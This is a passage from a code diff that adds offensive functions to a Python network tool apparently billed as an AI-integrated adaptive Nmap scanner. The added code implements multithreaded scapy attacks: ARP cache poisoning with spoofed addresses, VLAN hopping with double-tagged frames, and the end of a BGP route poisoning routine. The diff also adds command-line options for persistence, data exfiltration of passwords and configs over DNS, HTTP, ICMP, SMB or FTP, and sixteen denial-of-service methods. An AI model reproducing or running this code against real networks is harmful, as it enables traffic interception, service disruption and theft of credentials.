+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=bgp_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in BGP route poisoning attack: {e}")
+            return False
+            
+    def _arp_cache_poisoning_attack(self, target):
+        """Perform an ARP cache poisoning attack."""
+        try:
+            import scapy.all as scapy
+            import threading
+            import time
+            
+            def arp_attack():
+                while time.time() < end_time:
+                    try:
+                        # Create ARP packet
+                        arp = scapy.ARP(
+                            op=2,  # ARP reply
+                            pdst=target,
+                            hwdst="ff:ff:ff:ff:ff:ff",
+                            psrc="192.168.1.1",  # Spoofed IP
+                            hwsrc="00:11:22:33:44:55"  # Spoofed MAC
+                        )
+                        scapy.send(arp)
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=arp_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in ARP cache poisoning attack: {e}")
+            return False
+            
+    def _vlan_hopping_attack(self, target):
+        """Perform a VLAN hopping attack."""
+        try:
+            import scapy.all as scapy
+            import threading
+            import time
+            
+            def vlan_attack():
+                while time.time() < end_time:
+                    try:
+                        # Create double-tagged VLAN packet
+                        packet = (
+                            scapy.Ether() /
+                            scapy.Dot1Q(vlan=1) /  # Outer VLAN
+                            scapy.Dot1Q(vlan=2) /  # Inner VLAN
+                            scapy.IP(dst=target) /
+                            scapy.TCP(dport=80)
+                        )
+                        scapy.send(packet)
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=vlan_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in VLAN hopping attack: {e}")
+            return False
+
 def parse_arguments():
-    """Parse command line arguments."""
-    parser = argparse.ArgumentParser(
-        description="Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter
-    )
+    parser = argparse.ArgumentParser(description='Adaptive Nmap Scanner with AI Integration')
     
-    # Target selection options
-    target_group = parser.add_argument_group("Target Selection")
-    target_group.add_argument(
-        "target", 
-        nargs="?",
-        help="Target IP or hostname to scan (optional if using auto-discover)"
-    )
-    target_group.add_argument(
-        "--auto-discover", 
-        action="store_true",
-        help="Automatically discover hosts on the network"
-    )
-    target_group.add_argument(
-        "--scan-all", 
-        action="store_true",
-        help="Scan all discovered hosts"
-    )
-    target_group.add_argument(
-        "--interface", 
-        help="Network interface to use for discovery"
-    )
-    target_group.add_argument(
-        "--network", 
-        help="Network CIDR to scan (e.g., 192.168.1.0/24)"
-    )
-    target_group.add_argument(
-        "--host-timeout", 
-        type=int, 
-        default=1,
-        help="Timeout in seconds for host discovery"
-    )
+    # Basic arguments
+    parser.add_argument('target', help='Target host or network to scan')
+    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
+    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
     
-    # Scan options
-    scan_group = parser.add_argument_group("Scan Options")
-    scan_group.add_argument(
-        "--iterations", "-i",
-        type=int, 
-        default=3,
-        help="Maximum number of scan iterations"
-    )
-    scan_group.add_argument(
-        "--continuous", "-c",
-        action="store_true",
-        help="Continuously scan the target"
-    )
-    scan_group.add_argument(
-        "--delay", "-d",
-        type=int, 
-        default=2,
-        help="Delay between scan iterations in seconds"
-    )
-    scan_group.add_argument(
-        "--stealth", 
-        action="store_true",
-        help="Enable stealth mode to minimize detection"
-    )
-    scan_group.add_argument(
-        "--model", "-m",
-        default="qwen2.5-coder:7b",
-        help="Ollama model to use (qwen2.5-coder:7b, gemma3:1b, etc.)"
-    )
+    # Red team arguments
+    parser.add_argument('--red-team', action='store_true', help='Enable full red team mode')
+    parser.add_argument('--persistence', action='store_true', help='Attempt to establish persistent access')
+    parser.add_argument('--exfil', action='store_true', help='Enable data exfiltration')
+    parser.add_argument('--exfil-method', choices=['dns', 'http', 'icmp', 'smb', 'ftp'], help='Data exfiltration method')
+    parser.add_argument('--exfil-data', choices=['passwords', 'configs', 'all'], help='Data to exfiltrate')
+    parser.add_argument('--exfil-server', help='Server to exfiltrate data to')
     
-    # Metasploit options
-    msf_group = parser.add_argument_group("Metasploit Options")
-    msf_group.add_argument(
-        "--msf", 
-        action="store_true",
-        help="Enable Metasploit integration"
-    )
-    msf_group.add_argument(
-        "--exploit", 
-        action="store_true",
-        help="Automatically attempt exploitation"
-    )
-    msf_group.add_argument(
-        "--workspace", 
-        default="adaptive_scan",
-        help="Metasploit workspace name"
-    )
-    msf_group.add_argument(
-        "--auto-script", 
-        action="store_true",
-        help="Auto-generate Metasploit resource scripts"
-    )
-    msf_group.add_argument(
-        "--dos", 
-        action="store_true",
-        help="Attempt DoS attacks against target hosts"
-    )
+    # DoS arguments
+    parser.add_argument('--dos', action='store_true', help='Enable DoS attack mode')
+    parser.add_argument('--dos-method', choices=[
+        'udp', 'icmp', 'slowloris', 'syn', 'http',
+        'cpu', 'memory', 'disk',
+        'http2', 'dns', 'slowpost',
+        'dbpool', 'cache',
+        'bgp', 'arp', 'vlan'
+    ], help='DoS attack method')
+    parser.add_argument('--dos-threads', type=int, default=10, help='Number of attack threads')
+    parser.add_argument('--dos-duration', type=int, default=60, help='Attack duration in seconds')
+    parser.add_argument('--dos-payload', help='Custom payload for DoS attack')
     
-    # Script generation options
-    script_group = parser.add_argument_group("Script Generation Options")
-    script_group.add_argument(
-        "--custom-scripts", 
-        action="store_true",
-        help="Generate custom scripts based on scan results"
-    )
-    script_group.add_argument(
-        "--script-type", 
-        choices=["bash", "python", "ruby"],
-        default="bash",
-        help="Type of scripts to generate"
-    )
-    script_group.add_argument(
-        "--execute-scripts", 
-        action="store_true",
-        help="Execute generated scripts (use with caution)"
-    )
+    # Other arguments
+    parser.add_argument('--output', help='Output file for scan results')
+    parser.add_argument('--format', choices=['text', 'xml', 'json'], default='text', help='Output format')
     
-    # AI display options
-    ai_group = parser.add_argument_group("AI Display Options")
-    ai_group.add_argument(
-        "--show-live-ai", 
-        action="store_true",
-        help="Show the AI's thought process in real-time"
-    )
-    
-    # General options
-    general_group = parser.add_argument_group("General Options")
-    general_group.add_argument(
-        "--full-auto", 
-        action="store_true",
-        help="Full autonomous mode (enables multiple features)"
-    )
-    general_group.add_argument(
-        "--quiet", 
-        action="store_true",
-        help="Reduce output verbosity"
-    )
-    general_group.add_argument(
-        "--debug", 
-        action="store_true",
-        help="Enable debug logging"
-    )
-    
-    args = parser.parse_args()
-    
-    # Full auto mode implications
-    if args.full_auto:
-        args.continuous = True
-        args.msf = True
-        args.exploit = True
-        args.auto_script = True
-        args.custom_scripts = True
-    
-    # Network discovery implications
-    if args.scan_all:
-        args.auto_discover = True
-    
-    # Check if we have a target or auto-discover
-    if not args.target and not args.auto_discover:
-        logger.error("Error: Either a target must be specified or --auto-discover must be enabled")
-        parser.print_help()
-        sys.exit(1)
-    
-    # Initialize scanner with appropriate options
-    scanner = AdaptiveNmapScanner(
-        target=args.target,
-        ollama_model=args.model,
-        max_iterations=args.iterations,
-        continuous=args.continuous,
-        delay=args.delay,
-        msf_integration=args.msf,
-        exploit=args.exploit,
-        msf_workspace=args.workspace,
-        stealth=args.stealth,
-        auto_script=args.auto_script,
-        quiet=args.quiet,
-        debug=args.debug,
-        auto_discover=args.auto_discover,
-        interface=args.interface,
-        scan_all=args.scan_all,
-        network=args.network,
-        host_timeout=args.host_timeout,
-        custom_scripts=args.custom_scripts,
-        script_type=args.script_type,
-        execute_scripts=args.execute_scripts,
-        dos_attack=args.dos,
-        show_live_ai=args.show_live_ai
-    )
-    
-    return scanner
+    return parser.parse_args()
 
 def main():
     """Main entry point."""
